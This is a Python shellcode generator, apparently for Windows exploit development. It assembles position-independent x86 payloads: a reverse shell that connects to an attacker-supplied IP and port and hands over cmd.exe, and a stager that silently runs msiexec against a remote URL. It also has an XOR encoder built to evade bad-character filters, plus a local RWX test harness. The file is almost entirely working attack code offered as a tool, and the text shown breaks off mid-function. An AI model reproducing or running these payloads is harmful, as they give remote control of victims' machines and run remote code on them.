#!/usr/bin/python3
import sys
import argparse
import ctypes, struct, numpy, re
import keystone as ks
from capstone import Cs, CsInsn, CS_ARCH_X86, CS_MODE_32
from colorama import init, Fore, Back, Style

# init colorama
init()

# format utils
def visible_len(s: str) -> int:
    #Return the printable length of a string without ANSI escape codes.
    ansi_escape = re.compile(r"\x1b\[[0-9;]*m")
    return len(ansi_escape.sub("", s))

def pad_ansi(s: str, width: int) -> str:
    #Pad a colored string to a visible width.
    pad = width - visible_len(s)
    if pad > 0:
        return s + " " * pad
    return s


def to_hex(s):
    retval = list()
    # iterate each char (ej: 'A', 'B')
    for char in s:
        # Get the ASCII value (ord), convert it to hex, and remove the '0x' prefix that Python adds by default.
        retval.append(hex(ord(char)).replace("0x", ""))
    # adds it to a single string: "ABC" -> "414243"
    return "".join(retval)

def to_sin_ip(ip_address):
    ip_addr_hex = []
    # divide ip "192.168.1.1" -> ["192", "168", "1", "1"]
    for block in ip_address.split("."):
        # convert each block (ie: 192 -> "c0")
        ip_addr_hex.append(format(int(block), "02x"))
    # reverse byte order 
    # (Little Endian), la IP 127.0.0.1 stores as 0x0100007f.
    ip_addr_hex.reverse()
    # returns value
    print("to_sin_ip value is: 0x"+"".join(ip_addr_hex))  # some log
    return "0x" + "".join(ip_addr_hex)

def to_sin_ip_neg(ip_address):
    # divide ip and format to hex
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    
    # little endian order
    ip_addr_hex.reverse()
    ip_str = "".join(ip_addr_hex)
    ip_int = int(ip_str, 16)

    # The expected value 0xfeffff81 is the arithmetic negative (two's complement) 
    # In Python, we use the 0xFFFFFFFF mask to force 32-bit representation for negative values
    negated_int = (-ip_int) & 0xFFFFFFFF
    negated_hex = format(negated_int, "08x")
    
    # some logs
    print(f"Original IP Hex: 0x{ip_str}")
    print(f"Arithmetic Negation (2's complement): 0x{negated_hex}")
    
    return "0x" + negated_hex

def to_sin_port(port):  # to avoid null bytes
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])

def to_sin_port_neg(port): # to avoid null bytes
    # Format to 4 characters hex (16 bits)
    port_hex = format(int(port), "04x")
    
    le_port_str = port_hex[2:4] + port_hex[0:2]
    le_port_int = int(le_port_str, 16)
    
    # Aapply mask 16 bits (0xFFFF)
    negated_int = ~le_port_int & 0xFFFF
    negated_hex = format(negated_int, "04x")
    
    print(f"Original Port (LE): 0x{le_port_str}")
    print(f"Negated Port for ASM: 0x{negated_hex}")
    
    return "0x" + negated_hex

def ror_str(byte, count):
    # Convert the number to a 32-bit binary string (padding with leading zeros)
    # This is necessary because Python handles arbitrary-precision integers, not fixed 32-bit values.
    binb = numpy.base_repr(byte, 2).zfill(32)
    # bit to bit rotation
    while count > 0:
        # The last bit (binb[-1]) is moved to the beginning 
        # and concatenated with the rest of the string except for the last bit.
        binb = binb[-1] + binb[0:-1]
        count -= 1
        
    # Returns the result converted back to a decimal integer
    return (int(binb, 2))

def push_function_hash(function_name):
    edx = 0x00
    ror_count = 0
    # iterate for each character (ie: 'W', 'i', 'n', 'E', 'x', 'e'...)
    for eax in function_name:
        # add up the value 
        edx = edx + ord(eax)
        # If it is not the last character, apply a 13-bit right rotation (0xd) 
        # This ensures that each character uniquely affects the final signature
        if ror_count < len(function_name)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    # pushes result
    return ("push " + hex(edx))

def push_string(input_string, clean_reg="eax", target_reg=None, init_null=True):
    # alling to 4 bytes with " " to avoid bad chars 
    # before using this check wether " " is a bad byte or not
    padding_len = (4 - (len(input_string) % 4)) % 4
    input_string += " " * padding_len
    # hex conversion
    rev_hex_payload = str(to_hex(input_string))
    rev_hex_payload_len = len(rev_hex_payload)
    instructions = []
    # null
    if init_null:
        instructions.append(f"xor {clean_reg}, {clean_reg}    ;")
        instructions.append(f"push {clean_reg}        ;")
    else:
        # if not use the clean register identified to opimize shellcode
        instructions.append(f"push {clean_reg}        ;")
    # 0 is the end
    # -8 jump from right to left (32 bits \ 1 dword)
    for i in range(rev_hex_payload_len, 0, -8): # because every byte is 2 hex chars we ensure 32 bits blocks
        target_bytes = rev_hex_payload[i-8:i]
        # little endian
        part1 = target_bytes[6:8]
        part2 = target_bytes[4:6]
        part3 = target_bytes[2:4]
        part4 = target_bytes[0:2]
        # push
        instruction = (
            f"push dword 0x{part1}{part2}{part3}{part4};"
        )
        instructions.append(instruction)

    if target_reg:
        # if chosen target, store ptr to it on the specified register
        instructions.append(f"push esp        ;")
        instructions.append(f"pop {target_reg}         ;")

    return "\n".join(instructions)

def encodeShellcode_pushDecoder(payload_bytes, key_arg, ks_engine):
    key = int(key_arg, 16) if key_arg.startswith("0x") else int(key_arg)

    payload_aligned = bytearray(payload_bytes)
    while len(payload_aligned) % 4 != 0:
        payload_aligned.append(0x90)

    encoded_payload = bytearray()
    for i in range(0, len(payload_aligned), 4):
        block = struct.unpack("<I", payload_aligned[i:i+4])[0]
        encoded_payload += struct.pack("<I", block ^ key)
    
    num_blocks = len(encoded_payload) // 4
    asm = [
        "   start:            ",
        "       jmp get_addr ;",
        "   decode:           ",
        "       pop edi      ;",
        "       xor ecx, ecx ;",
        f"      mov cl, {num_blocks} ;",
        "   loop_xor:         ",
        f"      xor dword ptr [edi + ecx*4 - 4], {hex(key)} ;", # decode from back to front
        "       loop loop_xor ;",
        "       jmp edi      ;",
        "   get_addr:         ",
        "       call decode  ;",
    ]
    
    try:
        stub_encoding, _ = ks_engine.asm("\n".join(asm))
        return bytearray(stub_encoding) + encoded_payload
    except Exception:
        return bytearray() 
    
def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    push_instr_terminate_hash = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_createprocessa_hash = push_function_hash("CreateProcessA")
    push_instr_wsastartup_hash = push_function_hash("WSAStartup")
    push_instr_wsasocketa_hash = push_function_hash("WSASocketA")
    push_instr_wsaconnect_hash = push_function_hash("WSAConnect")

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",  #
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;",  # ECX = 0
        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
        "   next_module:                         ",
        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
        "       jne next_module                 ;",  # No: try next module.
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;",  # Short jump
        "   find_function_ret:                   ",
        "       pop esi                         ;",  # POP the return address from the stack
        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
        "       jmp resolve_symbols_kernel32    ;",  #
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;",  # Relative CALL with negative offset
        "   find_function:                       ",
        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
        "       add edi, ebx                    ;",  # Export Table Directory VMA
        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
        "       add eax, ebx                    ;",  # AddressOfNames VMA
        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
        "       dec ecx                         ;",  # Decrement our names counter
        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
        "   compute_hash:                        ",
        "       xor eax, eax                    ;",  # NULL EAX
        "       cdq                             ;",  # NULL EDX
        "       cld                             ;",  # Clear direction
        "   compute_hash_again:                  ",
        "       lodsb                           ;",  # Load the next byte from esi into al
        "       test al, al                     ;",  # Check for NULL terminator
        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
        "       add edx, eax                    ;",  # Add the new byte to the accumulator
        "       jmp compute_hash_again          ;",  # Next iteration
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
        "       add eax, ebx                    ;",  # Get the function VMA
        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
        "   find_function_finished:              ",
        "       popad                           ;",  # Restore registers
        "       ret                             ;",  #
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,                   # TerminateProcess hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
        push_instr_createprocessa_hash,              # CreateProcessA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
        "   load_ws2_32:                         ",
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
        "       push eax                        ;",  # Push EAX on the stack with string NULL terminator
        "       push 0x642e3233                 ;",  # Push part of the string on the stack
        "       push 0x5f327377                 ;",  # Push another part of the string on the stack
        "       push esp                        ;",  # Push ESP to have a pointer to the string
        "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
        "   resolve_symbols_ws2_32:              ",
        "       mov ebx, eax                    ;",  # Move the base address of ws2_32.dll to EBX
        push_instr_wsastartup_hash,                  # WSAStartup hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup address for later usage
        push_instr_wsasocketa_hash,                  # WSASocketA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
        push_instr_wsaconnect_hash,                  # WSAConnect hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
        "   call_wsastartup:                    ;",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x590                   ;",  # Move 0x590 to CX
        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
        "       push eax                        ;",  # Push lpWSAData
        "       xor eax, eax                    ;",  # Null EAX
        "       mov ax, 0x0202                  ;",  # Move version to AX
        "       push eax                        ;",  # Push wVersionRequired
        "       call dword ptr [ebp+0x1C]       ;",  # Call WSAStartup
        "   call_wsasocketa:                     ",
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFlags
        "       push eax                        ;",  # Push g
        "       push eax                        ;",  # Push lpProtocolInfo
        "       mov al, 0x06                    ;",  # Move AL, IPPROTO_TCP
        "       push eax                        ;",  # Push protocol
        "       sub al, 0x05                    ;",  # Substract 0x05 from AL, AL = 0x01
        "       push eax                        ;",  # Push type
        "       inc eax                         ;",  # Increase EAX, EAX = 0x02
        "       push eax                        ;",  # Push af
        "       call dword ptr [ebp+0x20]       ;",  # Call WSASocketA
        "   call_wsaconnect:                     ",
        "       mov esi, eax                    ;",  # Move the SOCKET descriptor to ESI
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push sin_zero[]
        "       push eax                        ;",  # Push sin_zero[]
        f"      push {to_sin_ip(rev_ip_addr)}   ;",  # Push sin_addr (example: 192.168.2.1)
        f"      mov ax, {to_sin_port(rev_port)} ;",  # Move the sin_port (example: 443) to AX
        "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
        "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
        "       push eax                        ;",  # Push sin_port & sin_family
        "       push esp                        ;",  # Push pointer to the sockaddr_in structure
        "       pop edi                         ;",  # Store pointer to sockaddr_in in EDI
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpGQOS
        "       push eax                        ;",  # Push lpSQOS
        "       push eax                        ;",  # Push lpCalleeData
        "       push eax                        ;",  # Push lpCalleeData
        "       add al, 0x10                    ;",  # Set AL to 0x10
        "       push eax                        ;",  # Push namelen
        "       push edi                        ;",  # Push *name
        "       push esi                        ;",  # Push s
        "       call dword ptr [ebp+0x24]       ;",  # Call WSAConnect
        "   create_startupinfoa:                 ",
        "       push esi                        ;",  # Push hStdError
        "       push esi                        ;",  # Push hStdOutput
        "       push esi                        ;",  # Push hStdInput
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpReserved2
        "       push eax                        ;",  # Push cbReserved2 & wShowWindow
        "       mov al, 0x80                    ;",  # Move 0x80 to AL
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cl, 0x80                    ;",  # Move 0x80 to CX
        "       add eax, ecx                    ;",  # Set EAX to 0x100
        "       push eax                        ;",  # Push dwFlags
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push dwFillAttribute
        "       push eax                        ;",  # Push dwYCountChars
        "       push eax                        ;",  # Push dwXCountChars
        "       push eax                        ;",  # Push dwYSize
        "       push eax                        ;",  # Push dwXSize
        "       push eax                        ;",  # Push dwY
        "       push eax                        ;",  # Push dwX
        "       push eax                        ;",  # Push lpTitle
        "       push eax                        ;",  # Push lpDesktop
        "       push eax                        ;",  # Push lpReserved
        "       mov al, 0x44                    ;",  # Move 0x44 to AL
        "       push eax                        ;",  # Push cb
        "       push esp                        ;",  # Push pointer to the STARTUPINFOA structure
        "       pop edi                         ;",  # Store pointer to STARTUPINFOA in EDI
        "   create_cmd_string:                   ",
        "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
        "       neg eax                         ;",  # Negate EAX, EAX = 00657865
        "       push eax                        ;",  # Push part of the "cmd.exe" string
        "       push 0x2e646d63                 ;",  # Push the remainder of the "cmd.exe"
        "       push esp                        ;",  # Push pointer to the "cmd.exe" string
        "       pop ebx                         ;",  # Store pointer to the "cmd.exe" string
        "   call_createprocessa:                 ",
        "       mov eax, esp                    ;",  # Move ESP to EAX
        "       xor ecx, ecx                    ;",  # Null ECX
        "       mov cx, 0x390                   ;",  # Move 0x390 to CX
        "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
        "       push eax                        ;",  # Push lpProcessInformation
        "       push edi                        ;",  # Push lpStartupInfo
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpCurrentDirectory
        "       push eax                        ;",  # Push lpEnvironment
        "       push eax                        ;",  # Push dwCreationFlags
        "       inc eax                         ;",  # Increase EAX, EAX = 0x01 (TRUE)
        "       push eax                        ;",  # Push bInheritHandles
        "       dec eax                         ;",  # Null EAX
        "       push eax                        ;",  # Push lpThreadAttributes
        "       push eax                        ;",  # Push lpProcessAttributes
        "       push ebx                        ;",  # Push lpCommandLine
        "       push eax                        ;",  # Push lpApplicationName
        "       call dword ptr [ebp+0x18]       ;",  # Call CreateProcessA
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",  # Null ECX
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess
        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
    ]
    return "\n".join(asm)

def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    if rev_port == "80":
        rev_port = ""
    else:
        rev_port = (":" + rev_port)

    msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"
    msi_exec_str += " " * (len(msi_exec_str) % 4)

    push_instr_msvcrt = push_string("msvcrt.dll")
    push_instr_msi = push_string(msi_exec_str)
    push_instr_terminate_hash = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_system_hash = push_function_hash("system")

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;", 
        "       add esp, 0xfffff9f0             ;", 
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;", 
        "       mov esi,fs:[ecx+30h]            ;", 
        "       mov esi,[esi+0Ch]               ;", 
        "       mov esi,[esi+1Ch]               ;", 
        "   next_module:                         ",
        "       mov ebx, [esi+8h]               ;", 
        "       mov edi, [esi+20h]              ;", 
        "       mov esi, [esi]                  ;", 
        "       cmp [edi+12*2], cx              ;", 
        "       jne next_module                 ;", 
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;", 
        "   find_function_ret:                   ",
        "       pop esi                         ;", 
        "       mov [ebp+0x04], esi             ;", 
        "       jmp resolve_symbols_kernel32    ;", 
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;", 
        "   find_function:                       ",
        "       pushad                          ;", 
        "       mov eax, [ebx+0x3c]             ;", 
        "       mov edi, [ebx+eax+0x78]         ;", 
        "       add edi, ebx                    ;", 
        "       mov ecx, [edi+0x18]             ;", 
        "       mov eax, [edi+0x20]             ;", 
        "       add eax, ebx                    ;", 
        "       mov [ebp-4], eax                ;", 
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;", 
        "       dec ecx                         ;", 
        "       mov eax, [ebp-4]                ;", 
        "       mov esi, [eax+ecx*4]            ;", 
        "       add esi, ebx                    ;", 
        "   compute_hash:                        ",
        "       xor eax, eax                    ;", 
        "       cdq                             ;", 
        "       cld                             ;", 
        "   compute_hash_again:                  ",
        "       lodsb                           ;", 
        "       test al, al                     ;", 
        "       jz compute_hash_finished        ;", 
        "       ror edx, 0x0d                   ;", 
        "       add edx, eax                    ;", 
        "       jmp compute_hash_again          ;", 
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        "       cmp edx, [esp+0x24]             ;", 
        "       jnz find_function_loop          ;", 
        "       mov edx, [edi+0x24]             ;", 
        "       add edx, ebx                    ;", 
        "       mov cx, [edx+2*ecx]             ;", 
        "       mov edx, [edi+0x1c]             ;", 
        "       add edx, ebx                    ;", 
        "       mov eax, [edx+4*ecx]            ;", 
        "       add eax, ebx                    ;", 
        "       mov [esp+0x1c], eax             ;", 
        "   find_function_finished:              ",
        "       popad                           ;", 
        "       ret                             ;", 
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,                   
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x10], eax             ;", 
        push_instr_loadlibrarya_hash,                
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x14], eax             ;", 
        "   load_msvcrt:                         ",
        "       xor eax, eax                    ;", # \0
        "       push eax                        ;", 
        push_instr_msvcrt,                          # msvcrt.dll
        "       push+ esp                        ;", 
        "       call dword ptr [ebp+0x14]       ;", 
        "   resolve_symbols_msvcrt:              ",
        "       mov ebx, eax                    ;", 
        push_instr_system_hash,                      
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x18], eax             ;", 
        "   call_system:                         ",
        "       xor eax, eax                    ;", 
        "       push eax                        ;",
        push_instr_msi,
        "       push esp                        ;", 
        "       call dword ptr [ebp+0x18]       ;", 
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;", 
        "       push ecx                        ;", 
        "       push 0xffffffff                 ;", 
        "       call dword ptr [ebp+0x10]       ;", 
    ]
    return "\n".join(asm)

def msg_box(header, text, breakpoint=0):
    push_instr_user32 = push_string("user32.dll")
    push_instr_msgbox_hash = push_function_hash("MessageBoxA")
    push_instr_terminate_hash = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_header = push_string(header)
    push_instr_text = push_string(text)

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;", 
        "       add esp, 0xfffff9f0             ;", 
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;", 
        "       mov esi,fs:[ecx+30h]            ;", 
        "       mov esi,[esi+0Ch]               ;", 
        "       mov esi,[esi+1Ch]               ;", 
        "   next_module:                         ",
        "       mov ebx, [esi+8h]               ;", 
        "       mov edi, [esi+20h]              ;", 
        "       mov esi, [esi]                  ;", 
        "       cmp [edi+12*2], cx              ;", 
        "       jne next_module                 ;", 
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;", 
        "   find_function_ret:                   ",
        "       pop esi                         ;", 
        "       mov [ebp+0x04], esi             ;", 
        "       jmp resolve_symbols_kernel32    ;", 
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;", 
        "   find_function:                       ",
        "       pushad                          ;", 
        "       mov eax, [ebx+0x3c]             ;", 
        "       mov edi, [ebx+eax+0x78]         ;", 
        "       add edi, ebx                    ;", 
        "       mov ecx, [edi+0x18]             ;", 
        "       mov eax, [edi+0x20]             ;", 
        "       add eax, ebx                    ;", 
        "       mov [ebp-4], eax                ;", 
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;", 
        "       dec ecx                         ;", 
        "       mov eax, [ebp-4]                ;", 
        "       mov esi, [eax+ecx*4]            ;", 
        "       add esi, ebx                    ;", 
        "   compute_hash:                        ",
        "       xor eax, eax                    ;", 
        "       cdq                             ;", 
        "       cld                             ;", 
        "   compute_hash_again:                  ",
        "       lodsb                           ;", 
        "       test al, al                     ;", 
        "       jz compute_hash_finished        ;", 
        "       ror edx, 0x0d                   ;", 
        "       add edx, eax                    ;", 
        "       jmp compute_hash_again          ;", 
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        "       cmp edx, [esp+0x24]             ;", 
        "       jnz find_function_loop          ;", 
        "       mov edx, [edi+0x24]             ;", 
        "       add edx, ebx                    ;", 
        "       mov cx, [edx+2*ecx]             ;", 
        "       mov edx, [edi+0x1c]             ;", 
        "       add edx, ebx                    ;", 
        "       mov eax, [edx+4*ecx]            ;", 
        "       add eax, ebx                    ;", 
        "       mov [esp+0x1c], eax             ;", 
        "   find_function_finished:              ",
        "       popad                           ;", 
        "       ret                             ;", 
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,                   
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x10], eax             ;", 
        push_instr_loadlibrarya_hash,                
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x14], eax             ;", 
        "   load_user32:                         ",
        "       xor eax, eax                    ;", 
        "       push eax                        ;", 
       push_instr_user32,                              
        "       push esp                        ;", 
        "       call dword ptr [ebp+0x14]       ;", 
        "   resolve_symbols_user32:              ",
        "       mov ebx, eax                    ;", 
        push_instr_msgbox_hash,                      
        "       call dword ptr [ebp+0x04]       ;", 
        "       mov [ebp+0x18], eax             ;", 
        "   call_system:                         ",
        "       xor eax, eax                    ;", 
        "       push eax                        ;", 
        push_instr_header,                           
        "       mov ebx, esp                    ;", 
        "       xor eax, eax                    ;", 
        "       push eax                        ;", 
        push_instr_text,                             
        "       mov ecx, esp                    ;", 
        "       xor eax, eax                    ;", 
        "       push eax                        ;", 
        "       push ebx                        ;", 
        "       push ecx                        ;", 
        "       push eax                        ;", 
        "       call dword ptr [ebp+0x18]       ;", 
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;", 
        "       push ecx                        ;", 
        "       push 0xffffffff                 ;", 
        "       call dword ptr [ebp+0x10]       ;", 
    ]
    return "\n".join(asm)

def check_and_disassemble(encoding, bad_bytes):
    print(f"\n[!] {Fore.RED}BAD CHARACTERS DETECTED! Analyzing context...{Style.RESET_ALL}\n")
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    bytecode = bytes(encoding)
    instructions = list(md.disasm(bytecode, 0x00))    
    # index of instructions with bad chars
    bad_indices = []
    for idx, ins in enumerate(instructions):
        if any(b in bad_bytes for b in ins.bytes):
            bad_indices.append(idx)
            
    if not bad_indices:
        return # Should not happen if we are here
        
    CONTEXT_SIZE = 3
    lines_to_show = set()
    
    for bad_idx in bad_indices:
        start = max(0, bad_idx - CONTEXT_SIZE)
        end = min(len(instructions), bad_idx + CONTEXT_SIZE + 1)
        for i in range(start, end):
            lines_to_show.add(i)
            
    sorted_lines = sorted(list(lines_to_show))
    
    last_line_idx = -1
    
    for idx in sorted_lines:
        ins = instructions[idx]
        
        # separator check if there is a large gap between contexts
        if last_line_idx != -1 and idx > last_line_idx + 1:
            print(f"{Style.DIM}   ... [SKIPPING {idx - last_line_idx - 1} INSTRUCTIONS] ...{Style.RESET_ALL}")

        is_bad_ins = idx in bad_indices
        
        byte_str_list = []
        for b in ins.bytes:
            if b in bad_bytes:
                byte_str_list.append(f"{Fore.RED}{b:02x}{Style.RESET_ALL}")
            elif is_bad_ins:
                byte_str_list.append(f"{Fore.WHITE}{b:02x}{Style.RESET_ALL}")
            else:
                byte_str_list.append(f"{Fore.LIGHTBLACK_EX}{b:02x}{Style.RESET_ALL}")

        byte_str = " ".join(byte_str_list)
        padded_bytes = pad_ansi(byte_str, 24)

        if is_bad_ins:
            # style for error
            addr_str = f"{Fore.YELLOW}0x{ins.address:<4x}{Style.RESET_ALL}"
            mnemonic_str = f"{Fore.RED}{Style.BRIGHT}{ins.mnemonic} {ins.op_str}{Style.RESET_ALL}"
            arrow = f"{Fore.RED}<--- ERROR{Style.RESET_ALL}"
        else:
            # style for context
            addr_str = f"{Fore.LIGHTBLACK_EX}0x{ins.address:<4x}{Style.RESET_ALL}"
            mnemonic_str = f"{Fore.LIGHTBLACK_EX}{ins.mnemonic} {ins.op_str}{Style.RESET_ALL}"
            arrow = ""

        print(f"{addr_str} {padded_bytes}  {mnemonic_str} {arrow}")
        
        last_line_idx = idx

    print(f"\n[!] {Fore.RED}Fix the instructions marked above to proceed.{Style.RESET_ALL}")

def main(args):
    bad_ints = []
    if args.bad_chars:
        try:
            bad_ints = [int(b, 16) for b in args.bad_chars]
        except ValueError:
            print(f"{Fore.RED}[!] Error parsing bad chars. Ensure they are space separated hex values (e.g. -b 00 0a ff){Style.RESET_ALL}")
            sys.exit(1)

    if (args.msi):
        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break)
    elif (args.messagebox):
        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break)
    else:
        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break)

    print(f"[*] Compiling payload with Keystone...")

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    try:
        encoding, count = eng.asm(shellcode_asm)
    except ks.KsError as e:
        print(f"{Fore.RED}[!] Error compiling shellcode: {e}{Style.RESET_ALL}")
        sys.exit(1)
    
    final_shellcode = encoding 
    
    if args.key:
        initial_key = int(args.key, 16) if args.key.startswith("0x") else int(args.key)
        current_key = initial_key
        attempts = 0
        max_attempts = 1000000
        
        print(f"[*] Searching for a clean key starting from {hex(initial_key)}...")

        while attempts < max_attempts:
            candidate = encodeShellcode_pushDecoder(encoding, hex(current_key), eng)
            found_bad = [b for b in candidate if b in bad_ints]
            
            if not found_bad:
                print(f"\n[+] {Fore.GREEN}SUCCESS!{Style.RESET_ALL}")
                print(f"[+] Clean key found: {Fore.YELLOW}{hex(current_key)}{Style.RESET_ALL}")
                print(f"[+] Total attempts: {attempts + 1}")
                final_shellcode = candidate
                break
            else:
                current_key = (current_key + 1) & 0xFFFFFFFF
                attempts += 1
        
        if attempts == max_attempts:
            print(f"\n{Fore.RED}[!] FATAL: No clean key found after {max_attempts} attempts.{Style.RESET_ALL}")
            print("[!] The bad chars might be present in the static parts of your decoder stub.")
            sys.exit(1)

    encoding_list = list(final_shellcode)
    if any(b in bad_ints for b in encoding_list):
        print(f"\n{Fore.RED}[!] WARNING: Final shellcode still contains bad chars!{Style.RESET_ALL}")
        check_and_disassemble(encoding_list, bad_ints)

    final_hex = 'shellcode = b"'
    for enc in final_shellcode:
        final_hex += "\\x{0:02x}".format(enc)
    final_hex += '"'

    print(f"\n[+] {Fore.GREEN}Shellcode created successfully!{Style.RESET_ALL}")
    print(f"[=]   Payload len:   {len(encoding)} bytes")
    print(f"[=]   Total len:     {len(final_shellcode)} bytes (inc. decoder)")
    print(f"[=]   LHOST/LPORT:   {args.lhost}:{args.lport}")
    
    print("\n" + final_hex + "\n")

    # debug
    if args.test_shellcode:
        if (struct.calcsize("P")*8) == 32:
            print(f"[*] Starting local test (VirtualAlloc + CreateThread)...")
            packed_shellcode = bytearray(final_shellcode)
            
            # (0x40 = PAGE_EXECUTE_READWRITE)
            ptr = ctypes.windll.kernel32.VirtualAlloc(
                ctypes.c_int(0),
                ctypes.c_int(len(packed_shellcode)),
                ctypes.c_int(0x3000), # MEM_COMMIT | MEM_RESERVE
